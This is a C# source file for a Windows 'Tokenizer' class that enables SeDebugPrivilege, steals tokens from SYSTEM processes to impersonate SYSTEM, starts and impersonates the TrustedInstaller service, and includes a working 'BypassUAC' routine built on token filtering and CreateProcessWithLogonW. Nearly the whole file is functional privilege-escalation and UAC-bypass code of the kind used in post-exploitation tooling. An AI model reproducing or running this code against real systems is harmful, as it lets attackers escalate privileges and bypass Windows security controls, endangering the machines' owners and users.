﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace Engine.ProcessCore
{
    public static class Tokenizer
    {
        private static IntPtr hExistingToken;
        private static IntPtr currentProcessToken;
        private static IntPtr phNewToken;
        private static IntPtr luaToken;
        private static readonly Logger log = new Logger(LoggerType.Console_File, "ProcessCore.Tokenizer");


        private static readonly List<string> validPrivileges = new List<string>
        {
            "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege",
            "SeBackupPrivilege",
            "SeChangeNotifyPrivilege",
            "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege",
            "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege",
            "SeDebugPrivilege",
            "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege",
            "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege",
            "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege",
            "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege",
            "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege",
            "SeSecurityPrivilege",
            "SeShutdownPrivilege",
            "SeSyncAgentPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege",
            "SeSystemtimePrivilege",
            "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege",
            "SeTimeZonePrivilege",
            "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege",
            "SeUnsolicitedInputPrivilege"
        };

        //static Tokenizer()
        //{
        //    Logger.StartLogger(Environment.UserInteractive ? LoggerType.Console : LoggerType.File,
        //        "ProcessCore.Tokenizer");
        //}

        public static void SetProcessDebugToken(int procId)
        {
            log.Log(LogType.Normal, "[+] Attempting to set SE_DEBUG_PRIVILEGE on {0}...", procId.ToString("X"));
            var tmp = IntPtr.Zero;
            var tmpProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.All, false, procId);
            if (tmpProc != IntPtr.Zero)
            {
                if (WinAPI.OpenProcessToken(tmpProc, Constants.TOKEN_ALL_ACCESS, out tmp))
                {
                    SetTokenPrivilege(ref tmp, Constants.SE_DEBUG_NAME);
                    log.Log(LogType.Success, "SE_DEBUG_PRIVILEGE token should now be set!");
                    return;
                }

                log.Log(LogType.Failure, "Failed to OpenProcessToken from {0}!", procId.ToString("X"));
                return;
            }

            log.Log(LogType.Error, "Failed to OpenProcess from {0}: {1}", procId.ToString("X"),
                Marshal.GetLastWin32Error().ToString("X"));
        }

        public static void ElevateProcessToSystem(int pid)
        {
            log.Log(LogType.Normal, "[+] Attempting to elevate process with ID {0} to System Level...",
                pid.ToString("X"));
            if (GetPrimaryToken((uint) pid))
            {
                log.Log(LogType.Success, "Token found for {0}...", pid.ToString("X"));
                if (SetTokenInformation())
                {
                    log.Log(LogType.Success, "Token information for {0} loaded...", pid.ToString("X"));
                    if (ImpersonateSystem())
                        log.Log(LogType.Success, "Elevation to system level for {0} has been successfully set!",
                            pid.ToString("X"));
                    else
                        log.Log(LogType.Failure, "Failed to set system level access for process: {0}",
                            Marshal.GetLastWin32Error().ToString("X"));
                }
                else
                {
                    log.Log(LogType.Failure, "Failed to load token information for {0}: {1}", pid.ToString("X"),
                        Marshal.GetLastWin32Error().ToString("X"));
                }
            }
            else
            {
                log.Log(LogType.Failure, "Failed to get process's primary token: {0}",
                    Marshal.GetLastWin32Error().ToString("X"));
            }
        }

        public static void Initiate()
        {
            log.Log(LogType.Normal, "[+] Initiating Tokenizer...");
            currentProcessToken = new IntPtr();
            WinAPI.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS,
                out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
        }

        public static bool BypassUAC(int processId, string command)
        {
            if (GetPrimaryToken((uint) processId))
                if (SetTokenInformation())
                {
                    if (ImpersonateUser())
                        if (CreateProcessWithLogonW(phNewToken, command, ""))
                        {
                            WinAPI.RevertToSelf();
                            return true;
                        }

                    WinAPI.RevertToSelf();
                }

            return false;
        }

        public static bool ImpersonateTrustedInstaller()
        {
            log.Log(LogType.Normal, "[+] Elevating to System Level...");
            if (ImpersonateSystem())
                try
                {
                    var services = new Services("TrustedInstaller");

                    if (!services.StartService())
                    {
                        log.Log(LogType.Error, "StartService: {0}", Marshal.GetLastWin32Error());
                        return false;
                    }

                    if (!ImpersonateUser((int) services.GetServiceProcessId()))
                    {
                        log.Log(LogType.Error, "ImpersonateUser: {0}", Marshal.GetLastWin32Error());
                        return false;
                    }

                    log.Log(LogType.Success, "Elevated to Trusted Installer Level...");
                    return true;
                }
                catch (Exception ex)
                {
                    log.Log(LogType.Exception, "ImpersonateTrustedInstaller Exception: {0}", ex.Message);
                }

            log.Log(LogType.Error, "ImpersonateSystem: {0}", Marshal.GetLastWin32Error());
            return false;
        }

        public static bool ImpersonateSystem()
        {
            var securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            var systemAccount = (NTAccount) securityIdentifier.Translate(typeof(NTAccount));

            //log.Log(LogType.Debug, "Searching for: {0}", systemAccount.ToString());
            var processes = EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (var process in processes.Keys)
                if (ImpersonateUser((int) process))
                {
                    log.Log(LogType.Success, "Elevated to System Level...");
                    return true;
                }

            log.Log(LogType.Failure, "Failed to elevate to System Level...");
            return false;
        }

        public static bool ImpersonateUser(int processId)
        {
            //Console.WriteLine("[*] Impersonating {0}", processId);
            log.Log(LogType.Normal, "[+] Attempting to Impersonate: {0}", processId);
            GetPrimaryToken((uint) processId, "");
            if (hExistingToken == IntPtr.Zero) return false;
            var securityAttributes = new WinAPI.SECURITY_ATTRIBUTES();
            if (!WinAPI.DuplicateTokenEx(
                hExistingToken,
                (uint) WinAPI.ACCESS_MASK.MAXIMUM_ALLOWED,
                ref securityAttributes,
                WinAPI._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                WinAPI.TOKEN_TYPE.TokenPrimary,
                out phNewToken
            ))
            {
                log.Log(LogType.Error, "DuplicateTokenEx: {0}", Marshal.GetLastWin32Error());
                //GetError("DuplicateTokenEx: ");
                return false;
            }

            //Console.WriteLine(" [+] Duplicate Token Handle: {0}", phNewToken.ToInt32());
            log.Log(LogType.Normal, "[+] Duplicate Token Handle: {0}", phNewToken.ToInt32());
            if (!WinAPI.ImpersonateLoggedOnUser(phNewToken))
            {
                log.Log(LogType.Error, "ImpersonateLoggedOnUser: {0}", Marshal.GetLastWin32Error());
                //GetError("ImpersonateLoggedOnUser: ");
                return false;
            }

            return true;
        }

        public static bool GetPrimaryToken(uint processId, string name)
        {
            //Originally Set to true
            var hProcess = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation, true, (int) processId);
            if (hProcess == IntPtr.Zero) return false;
            //Console.WriteLine("[+] Recieved Handle for: " + name + " (" + processId + ")");
            log.Log(LogType.Normal, "[+] Recieved Handle for: {0} ({1})", name, processId);
            //Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());
            log.Log(LogType.Debug, "Process Handle: {0}", hProcess.ToInt32());

            if (!WinAPI.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken)) return false;
            //Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
            log.Log(LogType.Debug, "Primary Token Handle: {0}", hExistingToken.ToInt32());
            WinAPI.CloseHandle(hProcess);
            return true;
        }

        public static void SetTokenPrivilege(ref IntPtr hToken, string privilege)
        {
            if (!validPrivileges.Contains(privilege))
            {
                //Console.WriteLine("[-] Invalid Privilege Specified");
                log.Log(LogType.Error, "Invalid Privilege Specified!");
                return;
            }

            log.Log(LogType.Normal, "[+] Adjusting Token Privilege...");
            //Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            var luid = new WinAPI._LUID();
            if (!WinAPI.LookupPrivilegeValue(null, privilege, ref luid))
            {
                //GetError("LookupPrivilegeValue");
                log.Log(LogType.Failure, "LookupPrivilegeValue: {0}", Marshal.GetLastWin32Error());
                return;
            }

            //Console.WriteLine(" [+] Received luid");
            log.Log(LogType.Normal, "[+] Recieved LUID...");

            ////////////////////////////////////////////////////////////////////////////////
            var luidAndAttributes = new WinAPI._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;

            var newState = new WinAPI._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            var previousState = new WinAPI._TOKEN_PRIVILEGES();
            uint returnLength = 0;
            //Console.WriteLine(" [*] AdjustTokenPrivilege");
            //log.Log(LogType.Debug, "");
            if (!WinAPI.AdjustTokenPrivileges(hToken, false, ref newState, Marshal.SizeOf(newState), ref previousState,
                out returnLength))
            {
                //GetError("AdjustTokenPrivileges");
                log.Log(LogType.Failure, "AdjustTokenPrivileges: {0}", Marshal.GetLastWin32Error());
                return;
            }

            log.Log(LogType.Success, "Adjusted Token to: {0}", privilege);
            //Console.WriteLine(" [+] Adjusted Token to: " + privilege);
            //return;
        }

        public static bool CheckElevation(IntPtr hToken)
        {
            var tokenInformationLength = (uint) Marshal.SizeOf(typeof(uint));
            var tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(uint)));
            uint returnLength;

            var result = WinAPI.GetTokenInformation(
                hToken,
                WinAPI._TOKEN_INFORMATION_CLASS.TokenElevationType,
                tokenInformation,
                tokenInformationLength,
                out returnLength
            );

            switch ((WinAPI.TOKEN_ELEVATION_TYPE) Marshal.ReadInt32(tokenInformation))
            {
                case WinAPI.TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
                    ;
                    return false;
                case WinAPI.TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
                    return true;
                case WinAPI.TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
                    return false;
                default:
                    return true;
            }
        }

        public static bool SetTokenInformation()
        {
            var pIdentifierAuthority = new WinAPI.SidIdentifierAuthority();
            pIdentifierAuthority.Value = new byte[] {0x0, 0x0, 0x0, 0x0, 0x0, 0x10};
            byte nSubAuthorityCount = 1;
            var pSID = new IntPtr();
            if (!WinAPI.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0,
                0, out pSID))
            {
                log.Log(LogType.Error, "AllocateAndInitializeSid: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Normal, "[+] Initialized SID : {0}", pSID.ToInt64());

            var sidAndAttributes = new WinAPI.SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            var tokenMandatoryLabel = new WinAPI.TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            var tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);

            if (0 != WinAPI.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize))
            {
                log.Log(LogType.Error, "NtSetInformationToken: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Debug, "Set Token Information : {0}", phNewToken.ToInt64());

            var securityAttributes = new WinAPI.SECURITY_ATTRIBUTES();
            if (0 != WinAPI.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
            {
                log.Log(LogType.Error, "NtFilterToken: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Debug, "Set LUA Token Information : {0}", luaToken.ToInt64());
            return true;
        }

        public static bool ImpersonateUser()
        {
            var securityAttributes = new WinAPI.SECURITY_ATTRIBUTES();
            if (!WinAPI.DuplicateTokenEx(
                luaToken,
                Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY,
                ref securityAttributes,
                WinAPI._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                WinAPI.TOKEN_TYPE.TokenImpersonation,
                out phNewToken
            ))
            {
                log.Log(LogType.Error, "DuplicateTokenEx: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Debug, "Duplicate Token Handle: {0}", phNewToken.ToInt32().ToString("X"));
            //Console.WriteLine(" [+] Duplicate Token Handle : {0}", phNewToken.ToInt32());
            if (!WinAPI.ImpersonateLoggedOnUser(phNewToken))
            {
                log.Log(LogType.Error, "ImpersonateLoggedOnUser: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            return true;
        }

        public static bool GetPrimaryToken(uint processId)
        {
            //Originally Set to true
            var hProcess =
                WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryLimitedInformation, false, (int) processId);
            if (hProcess == IntPtr.Zero)
            {
                log.Log(LogType.Failure, "Unable to Open Process {0}: {1}", processId, Marshal.GetLastWin32Error());
                //Console.WriteLine(" [-] Unable to Open Process Token: {0}", processId);
                return false;
            }

            log.Log(LogType.Normal, "[+] Recieved Handle for: {0}", processId);
            //Console.WriteLine("[+] Recieved Handle for: {0}", processId);
            log.Log(LogType.Debug, "Process Handle: {0}", hProcess.ToInt32());
            //Console.WriteLine(" [+] Process Handle: {0}", hProcess.ToInt32());

            if (!WinAPI.OpenProcessToken(hProcess, (uint) WinAPI.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
                log.Log(LogType.Failure, "Unable to Open Process Token for {0}: {1}", hProcess.ToInt32(),
                    Marshal.GetLastWin32Error());
                //Console.WriteLine(" [-] Unable to Open Process Token: {0}", hProcess.ToInt32());
                return false;
            }

            log.Log(LogType.Debug, "Primary Token Handle: {0}", hExistingToken.ToInt32());
            //Console.WriteLine(" [+] Primary Token Handle: {0}", hExistingToken.ToInt32());
            WinAPI.CloseHandle(hProcess);

            var securityAttributes = new WinAPI.SECURITY_ATTRIBUTES();
            if (!WinAPI.DuplicateTokenEx(
                hExistingToken,
                Constants.TOKEN_ALL_ACCESS,
                ref securityAttributes,
                WinAPI._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                WinAPI.TOKEN_TYPE.TokenPrimary,
                out phNewToken
            ))
            {
                log.Log(LogType.Error, "DuplicateTokenEx: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Debug, "Existing Token Handle: {0}", hExistingToken.ToInt32());
            //Console.WriteLine(" [+] Existing Token Handle: {0}", hExistingToken.ToInt32());
            log.Log(LogType.Debug, "New Token Handle: {0}", phNewToken.ToInt32());
            //Console.WriteLine(" [+] New Token Handle: {0}", phNewToken.ToInt32());
            WinAPI.CloseHandle(hExistingToken);
            return true;
        }

        public static bool CreateProcessWithLogonW(IntPtr phNewToken, string name, string arguments)
        {
            if (name.Contains("\\"))
            {
                name = Path.GetFullPath(name);
                if (!File.Exists(name))
                {
                    log.Log(LogType.Failure, "Unable to find {0}...", Path.GetFileName(name));
                    //Console.WriteLine("[-] File Not Found");
                    return false;
                }
            }
            else
            {
                name = FindFilePath(name);
                if (string.Empty == name)
                {
                    log.Log(LogType.Failure, "Unable to find {0}...", Path.GetFileName(name));
                    //Console.WriteLine("[-] Unable to find file");
                    return false;
                }
            }

            //Console.WriteLine("[*] CreateProcessWithLogonW");
            log.Log(LogType.Debug, "Launching {0} CreateProcessWithLogonW...", Path.GetFileName(name));
            var startupInfo = new WinAPI._STARTUPINFO();
            startupInfo.cb = (uint) Marshal.SizeOf(typeof(WinAPI._STARTUPINFO));
            var processInformation = new WinAPI._PROCESS_INFORMATION();
            if (!WinAPI.CreateProcessWithLogonW(
                "i",
                "j",
                "k",
                0x00000002,
                name,
                arguments,
                0x04000000,
                IntPtr.Zero,
                Environment.SystemDirectory,
                ref startupInfo,
                out processInformation
            ))
            {
                log.Log(LogType.Failure, "Function CreateProcessWithLogonW failed: {0}",
                    Marshal.GetLastWin32Error().ToString("X"));
                //Console.WriteLine(" [-] Function CreateProcessWithLogonW failed: " + Marshal.GetLastWin32Error());
                return false;
            }

            log.Log(LogType.Success, "Created process/thread id's: {0}/{1}",
                processInformation.dwProcessId.ToString("X"),
                processInformation.dwThreadId.ToString("X"));
            //Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
            //Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
            return true;
        }

        public static string FindFilePath(string name)
        {
            var lpFileName = new StringBuilder(260);
            var lpFilePart = new IntPtr();
            var result = WinAPI.SearchPath(null, name, null, (uint) lpFileName.Capacity, lpFileName, ref lpFilePart);
            if (string.Empty == lpFileName.ToString())
            {
                //Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                log.Log(LogType.Error, "FindFilePath: {0}", Marshal.GetLastWin32Error());
                return string.Empty;
            }

            return lpFileName.ToString();
        }

        public static Dictionary<uint, string> EnumerateUserProcesses(bool findElevation, string userAccount)
        {
            var users = new Dictionary<uint, string>();
            var pids = Process.GetProcesses();
            log.Log(LogType.Debug, "Examining {0} processes...", pids.Length);
            //Console.WriteLine("[*] Examining {0} processes", pids.Length);
            foreach (var p in pids)
            {
                var hProcess = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryLimitedInformation, true, p.Id);
                if (IntPtr.Zero == hProcess) continue;
                IntPtr hToken;
                if (!WinAPI.OpenProcessToken(hProcess, (uint) WinAPI.ACCESS_MASK.MAXIMUM_ALLOWED, out hToken)) continue;
                WinAPI.CloseHandle(hProcess);

                if (findElevation && !CheckElevation(hToken)) continue;

                uint dwLength = 0;
                var tokenStatistics = new WinAPI._TOKEN_STATISTICS();
                if (!WinAPI.GetTokenInformation(hToken, WinAPI._TOKEN_INFORMATION_CLASS.TokenStatistics,
                    ref tokenStatistics, dwLength, out dwLength))
                    if (!WinAPI.GetTokenInformation(hToken, WinAPI._TOKEN_INFORMATION_CLASS.TokenStatistics,
                        ref tokenStatistics, dwLength, out dwLength))
                        continue;
                WinAPI.CloseHandle(hToken);

                if (WinAPI.TOKEN_TYPE.TokenImpersonation == tokenStatistics.TokenType) continue;


                var userName = string.Empty;
                if (!ConvertTokenStatisticsToUsername(tokenStatistics, ref userName)) continue;
                if (userName.ToUpper() == userAccount.ToUpper())
                {
                    users.Add((uint) p.Id, p.ProcessName);
                    if (findElevation) return users;
                }
            }

            log.Log(LogType.Debug, "Discovered {0} processes...", users.Count);
            //Console.WriteLine("[*] Discovered {0} processes", users.Count);

            var sorted = new Dictionary<uint, string>();
            foreach (var user in users.OrderBy(u => u.Value)) sorted.Add(user.Key, user.Value);

            return sorted;
        }

        private static bool ConvertTokenStatisticsToUsername(WinAPI._TOKEN_STATISTICS tokenStatistics,
            ref string userName)
        {
            var lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI._LUID)));
            Marshal.StructureToPtr(tokenStatistics.AuthenticationId, lpLuid, false);
            if (IntPtr.Zero == lpLuid) return false;

            var ppLogonSessionData = new IntPtr();
            if (0 != WinAPI.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData)) return false;

            if (IntPtr.Zero == ppLogonSessionData) return false;

            var securityLogonSessionData =
                (WinAPI._SECURITY_LOGON_SESSION_DATA) Marshal.PtrToStructure(ppLogonSessionData,
                    typeof(WinAPI._SECURITY_LOGON_SESSION_DATA));
            if (IntPtr.Zero == securityLogonSessionData.Sid ||
                IntPtr.Zero == securityLogonSessionData.UserName.Buffer ||
                IntPtr.Zero == securityLogonSessionData.LogonDomain.Buffer) return false;

            if (Environment.MachineName + "$" == Marshal.PtrToStringUni(securityLogonSessionData.UserName.Buffer) &&
                ConvertSidToName(securityLogonSessionData.Sid, ref userName)) return true;

            userName = string.Format("{0}\\{1}", Marshal.PtrToStringUni(securityLogonSessionData.LogonDomain.Buffer),
                Marshal.PtrToStringUni(securityLogonSessionData.UserName.Buffer));
            return true;
        }

        public static bool ConvertSidToName(IntPtr sid, ref string userName)
        {
            var lpName = new StringBuilder();
            var cchName = (uint) lpName.Capacity;
            var lpReferencedDomainName = new StringBuilder();
            var cchReferencedDomainName = (uint) lpReferencedDomainName.Capacity;
            WinAPI._SID_NAME_USE sidNameUser;
            WinAPI.LookupAccountSid(string.Empty, sid, lpName, ref cchName, lpReferencedDomainName,
                ref cchReferencedDomainName, out sidNameUser);

            lpName.EnsureCapacity((int) cchName);
            lpReferencedDomainName.EnsureCapacity((int) cchReferencedDomainName);
            if (WinAPI.LookupAccountSid(string.Empty, sid, lpName, ref cchName, lpReferencedDomainName,
                ref cchReferencedDomainName, out sidNameUser)) return false;
            if (string.IsNullOrEmpty(lpName.ToString()) ||
                string.IsNullOrEmpty(lpReferencedDomainName.ToString())) return false;
            userName = lpReferencedDomainName + "\\" + lpName;
            return true;
        }


        public class Constants
        {
            public const ulong SE_GROUP_ENABLED = 0x00000004L;
            public const ulong SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002L;
            public const ulong SE_GROUP_INTEGRITY = 0x00000020L;
            public const uint SE_GROUP_INTEGRITY_32 = 0x00000020;
            public const ulong SE_GROUP_INTEGRITY_ENABLED = 0x00000040L;
            public const ulong SE_GROUP_LOGON_ID = 0xC0000000L;
            public const ulong SE_GROUP_MANDATORY = 0x00000001L;
            public const ulong SE_GROUP_OWNER = 0x00000008L;
            public const ulong SE_GROUP_RESOURCE = 0x20000000L;
            public const ulong SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010L;

            public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
            public const string SE_BACKUP_NAME = "SeBackupPrivilege";
            public const string SE_DEBUG_NAME = "SeDebugPrivilege";
            public const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
            public const string SE_TCB_NAME = "SeTcbPrivilege";

            public const uint SE_PRIVILEGE_ENABLED = 0x2;
            public const uint SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
            public const uint SE_PRIVILEGE_REMOVED = 0x4;
            public const uint SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;

            public const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
            public const uint STANDARD_RIGHTS_READ = 0x00020000;
            public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
            public const uint TOKEN_DUPLICATE = 0x0002;
            public const uint TOKEN_IMPERSONATE = 0x0004;
            public const uint TOKEN_QUERY = 0x0008;
            public const uint TOKEN_QUERY_SOURCE = 0x0010;
            public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
            public const uint TOKEN_ADJUST_GROUPS = 0x0040;
            public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
            public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
            public const uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;

            public const uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                                 TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY |
                                                 TOKEN_QUERY_SOURCE |
                                                 TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                                 TOKEN_ADJUST_SESSIONID;

            public const uint TOKEN_ALT = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY;
        }

        public class Services
        {
            private uint ProcessId;
            private readonly ServiceController service;
            private readonly string serviceName;

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public Services(string serviceName)
            {
                //Logger.StartLogger(Environment.UserInteractive ? LoggerType.Console : LoggerType.File,
                //    "ProcessCore.Services");
                this.serviceName = serviceName;
                service = new ServiceController(serviceName);
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public bool StartService()
            {
                log.Log(LogType.Normal, "[+] Starting Service ", serviceName);
                //Console.WriteLine("[*] Starting Service " + serviceName);
                if (service.Status == ServiceControllerStatus.Running) return true;

                service.Start();
                while (service.Status == ServiceControllerStatus.StartPending ||
                       service.Status == ServiceControllerStatus.Stopped)
                {
                    Thread.Sleep(1000);
                    //Console.Write("+");
                    service.Refresh();
                }
                //Console.Write("\n");

                if (service.Status == ServiceControllerStatus.Running)
                    return true;
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public bool StopService()
            {
                log.Log(LogType.Normal, "[-] Stopping Service ", serviceName);
                //Console.WriteLine("[+] Stopping Service " + serviceName);
                if (service.CanStop)
                {
                    service.Stop();
                    while (service.Status == ServiceControllerStatus.StopPending)
                    {
                        Thread.Sleep(1000);
                        //Console.Write("-");
                        service.Refresh();
                    }
                    //Console.Write("\n");

                    if (service.Status == ServiceControllerStatus.Stopped)
                        return true;
                    return false;
                }

                if (service.CanPauseAndContinue)
                {
                    service.Pause();
                    while (service.Status == ServiceControllerStatus.PausePending)
                    {
                        Thread.Sleep(1000);
                        //Console.Write("-");
                        service.Refresh();
                    }
                    //Console.Write("\n");

                    if (service.Status == ServiceControllerStatus.Paused)
                        return true;
                    return false;
                }

                log.Log(LogType.Error, "Unable to stop service!");
                //Console.WriteLine("Unable to stop service");
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public uint GetServiceProcessId()
            {
                var systemProcesses = new List<ManagementObject>();
                var scope = new ManagementScope("\\\\.\\root\\cimv2");
                scope.Connect();
                if (!scope.IsConnected) log.Log(LogType.Failure, "Failed to connect to WMI!");

                //Console.WriteLine(" [*] Querying for service: " + serviceName);
                log.Log(LogType.Debug, "Querying for service: {0}", serviceName);
                var query = new ObjectQuery("SELECT * FROM Win32_Service WHERE Name = \'" + serviceName + "\'");
                var objectSearcher = new ManagementObjectSearcher(scope, query);
                var objectCollection = objectSearcher.Get();
                if (objectCollection == null) Console.WriteLine("ManagementObjectCollection");
                foreach (ManagementObject managementObject in objectCollection)
                    ProcessId = (uint) managementObject["ProcessId"];
                //Console.WriteLine(" [+] Returned PID: " + ProcessId);
                log.Log(LogType.Success, "Returned PID: " + ProcessId);
                return ProcessId;
            }
        }
    }
}